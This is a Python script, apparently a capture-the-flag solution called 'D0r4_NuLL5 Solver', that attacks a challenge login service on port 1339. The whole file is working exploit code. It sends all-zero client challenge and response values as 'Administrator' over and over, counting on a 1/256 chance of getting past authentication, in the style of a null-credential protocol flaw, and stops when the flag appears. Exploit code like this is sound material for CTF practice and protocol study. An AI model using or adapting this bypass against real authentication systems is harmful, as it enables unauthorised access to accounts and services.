#!/usr/bin/env python3
import sys
import socket
import argparse

def attempt_login(host, port, client_challenge, username, client_response):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    s.recv(4096)
    s.sendall(b"1\n")
    s.recv(4096)
    s.sendall(f"{client_challenge}\n".encode())
    s.recv(4096)
    s.sendall(f"{username}\n".encode())
    s.recv(4096)
    s.sendall(f"{client_response}\n".encode())
    response = s.recv(4096).decode()
    s.close()
    
    if "flag" in response or "p_ctf" in response:
        return True, response
    return False, response

def probabilistic_attack(host="localhost", port=1339, max_attempts=1000):
    print("D0r4_NuLL5 Solver")
    print("Protocol Analysis Exploit")
    print(f"Target: {host}:{port}")
    print(f"Maximum attempts: {max_attempts}\n")
    
    client_challenge = "0000000000000000"
    username = "Administrator"
    client_response = "0000000000000000"
    
    print("Attack parameters:")
    print(f"  Client challenge: {client_challenge}")
    print(f"  Username: {username}")
    print(f"  Client response: {client_response}")
    print(f"\nExpected success probability: 1/256 per attempt")
    print(f"Expected attempts for 99% success: 1177\n")
    
    for attempt in range(1, max_attempts + 1):
        try:
            success, response = attempt_login(host, port, client_challenge, username, client_response)
            
            if success:
                print(f"\nAuthentication successful on attempt {attempt}")
                print(f"Response:\n{response}")
                return True
            
            if attempt % 10 == 0:
                print(f"Attempt {attempt}/{max_attempts} (expected success rate: {attempt/256:.1%})")
        
        except Exception as e:
            print(f"Error on attempt {attempt}: {e}")
            continue
    
    print(f"\nFailed after {max_attempts} attempts")
    print(f"Statistically unlikely. Verify connection and parameters.")
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="D0r4_NuLL5 Solver")
    parser.add_argument("--host", default="localhost", help="Target host")
    parser.add_argument("--port", type=int, default=1339, help="Target port")
    parser.add_argument("--max-attempts", type=int, default=1000, help="Maximum attempts")
    
    args = parser.parse_args()
    
    success = probabilistic_attack(args.host, args.port, args.max_attempts)
    
    sys.exit(0 if success else 1)
